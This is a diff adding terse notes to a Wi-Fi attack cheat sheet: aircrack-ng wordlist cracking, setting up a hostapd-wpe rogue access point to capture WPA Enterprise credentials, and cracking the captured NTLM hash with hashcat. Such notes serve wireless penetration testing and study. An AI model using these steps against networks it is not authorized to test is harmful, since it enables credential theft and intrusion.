@@ -43,3 +43,19 @@ aircrack-ng (.cap) -w test.txt
 
 sudo NetworkManager start
 [restart Machine's wireless interface]
+
+apt-get install hostapd-wpe
+[install hostapd-wpe]
+
+nano /etc/hostapd-wpe/hostapd-wpe.conf
+[configure file]
+
+hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+[start hostapd in etc file part]
+
+CTRL + F 
+[search webpage info}
+
+hashcat -m (mode NTLM) (hash_file.txt) (/file_path/wordlist.txt)
+[crack WPA Enterprise against hash]
+
